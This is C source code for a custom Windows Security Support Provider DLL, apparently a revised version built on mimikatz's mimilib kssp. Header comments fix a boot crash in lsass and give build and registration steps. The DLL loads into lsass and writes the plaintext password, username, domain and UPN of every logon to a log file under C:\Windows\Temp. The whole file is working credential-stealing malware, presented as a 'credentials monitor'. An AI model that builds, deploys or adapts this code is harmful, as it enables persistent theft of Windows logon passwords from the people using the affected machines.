// sspmon2.c — v2 SSP: fixes the v1 boot-crash on Win11 26200.
//
// v1 root cause (crash, operator-observed 2026-09-29): the SECPKG_FUNCTION_TABLE
// .Initialize slot was NULL. LSA calls SpInitialize for every registered package
// at boot-load (hands the package its LSA_SECPKG_FUNCTION_TABLE); a NULL there
// = NULL-deref in lsass = CRITICAL_PROCESS_DIED loop. v1 also wrote ANSI strings
// from SpGetInfo into what must be the wide PSecPkgInfoW interface.
//
// v2 = mimilib kssp-exact layout: Initialize/Shutdown/GetInfo/AcceptCredentials
// all implemented with kssp signatures; everything else NULL (proven layout).
// Logger unchanged: SpAcceptCredentials appends one plaintext line per logon to
// C:\Windows\Temp\ssp.log (CreateFileW append, no CRT, lsass-safe).
//
// Build: x86_64-w64-mingw32-gcc -shared -O2 -static -o sspmon2.dll sspmon2.c
// Register as: Security Packages = sspmon2  (loads System32\sspmon2.dll)

// LSA's dispatch interface is wide-only: UNICODE/_UNICODE MUST be defined
// before headers, or mingw types the GetInfo slot as SecPkgInfoA* while real
// LSA passes SecPkgInfoW (v1 bug #2).
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#define SECURITY_WIN32
#include <ntsecapi.h>
#include <sspi.h>
#include <stdio.h>
#include <ntsecpkg.h>

// mingw's windows.h chain doesn't define these (and ntstatus.h conflicts with
// winnt.h) — guard-define instead of including ntstatus.h.
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef SECPKG_ID_NONE
#define SECPKG_ID_NONE 0x0000FFFF
#endif

static const wchar_t LOG_PATH[] = L"C:\\Windows\\Temp\\ssp.log";

static int UsToAscii(const UNICODE_STRING *us, char *out, int cap)
{
	int n = 0;
	if(!us || !us->Buffer) { out[0] = 0; return 0; }
	for(USHORT i = 0; i < us->Length / 2 && n < cap - 4; i++)
	{
		wchar_t c = us->Buffer[i];
		if(c >= 0x20 && c < 0x7f) out[n++] = (char) c;
		else if(!c) out[n++] = '.';
		else out[n++] = '?';
	}
	out[n] = 0;
	return n;
}

static void AppendLine(const char *line, DWORD len)
{
	HANDLE f = CreateFileW(LOG_PATH, FILE_APPEND_DATA | SYNCHRONIZE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(f == INVALID_HANDLE_VALUE) return;
	SetFilePointer(f, 0, NULL, FILE_END);
	DWORD w = 0;
	WriteFile(f, line, len, &w, NULL);
	CloseHandle(f);
}

// kssp-exact signature
static NTSTATUS NTAPI MyAcceptCredentials(SECURITY_LOGON_TYPE LogonType,
	PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials,
	PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	char acct[128] = "", user[128] = "", dom[128] = "", pass[128] = "", upn[128] = "", dns[128] = "";
	UsToAscii(AccountName, acct, sizeof(acct));
	UsToAscii(&PrimaryCredentials->DownlevelName, user, sizeof(user));
	UsToAscii(&PrimaryCredentials->DomainName, dom, sizeof(dom));
	UsToAscii(&PrimaryCredentials->Password, pass, sizeof(pass));
	UsToAscii(&PrimaryCredentials->Upn, upn, sizeof(upn));
	UsToAscii(&PrimaryCredentials->DnsDomainName, dns, sizeof(dns));

	char line[1024];
	int n = snprintf(line, sizeof(line) - 2,
		"v=2 tick=%llu type=%lu acct=%s user=%s dom=%s pass=%s upn=%s dns=%s\r\n",
		(unsigned long long) GetTickCount64(), (unsigned long) LogonType,
		acct, user, dom, pass, upn, dns);
	if(n > 0) AppendLine(line, (DWORD) n);
	return 0;
}

// kssp-exact: wide strings, capabilities copied from kssp
static NTSTATUS NTAPI MyGetInfo(PSecPkgInfoW PackageInfo)
{
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wVersion   = 1;
	PackageInfo->wRPCID     = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->Name       = L"SspMonitor2";
	PackageInfo->Comment    = L"credentials monitor v2";
	return 0;
}

// THE v1 fix: this slot MUST be implemented. kssp-exact signature.
static NTSTATUS NTAPI MyInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters,
	PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
	(void) PackageId; (void) Parameters; (void) FunctionTable;
	return STATUS_SUCCESS;
}

static NTSTATUS NTAPI MyShutdown(void) { return STATUS_SUCCESS; }

static const SECPKG_FUNCTION_TABLE Table = {
	.InitializePackage = NULL,
	.LogonUser = NULL,
	.CallPackage = NULL,
	.LogonTerminated = NULL,
	.CallPackageUntrusted = NULL,
	.CallPackagePassthrough = NULL,
	.LogonUserEx = NULL,
	.LogonUserEx2 = NULL,
	.Initialize = MyInitialize,          // <- was NULL in v1 = the crash
	.Shutdown = MyShutdown,
	.GetInfo = MyGetInfo,
	.AcceptCredentials = MyAcceptCredentials,
	.AcquireCredentialsHandle = NULL,
	.QueryCredentialsAttributes = NULL,
	.FreeCredentialsHandle = NULL,
	.SaveCredentials = NULL,
	.GetCredentials = NULL,
	.DeleteCredentials = NULL,
	.InitLsaModeContext = NULL,
	.AcceptLsaModeContext = NULL,
	.DeleteContext = NULL,
	.ApplyControlToken = NULL,
	.GetUserInfo = NULL,
	.GetExtendedInformation = NULL,
	.QueryContextAttributes = NULL,
	.AddCredentials = NULL,
	.SetExtendedInformation = NULL,
	.SetContextAttributes = NULL,
	.SetCredentialsAttributes = NULL,
};

__declspec(dllexport) NTSTATUS SEC_ENTRY SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion,
	PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	(void) LsaVersion;
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = (PSECPKG_FUNCTION_TABLE) &Table;
	*pcTables = 1;
	return STATUS_SUCCESS;
}

__declspec(dllexport) NTSTATUS SEC_ENTRY SpUserModeInitialize(ULONG LsaVersion, PULONG PackageVersion,
	PSECPKG_USER_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	(void) LsaVersion;
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = NULL;
	*pcTables = 0;
	return STATUS_SUCCESS;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r)
{
	(void) h; (void) reason; (void) r;
	return TRUE;
}
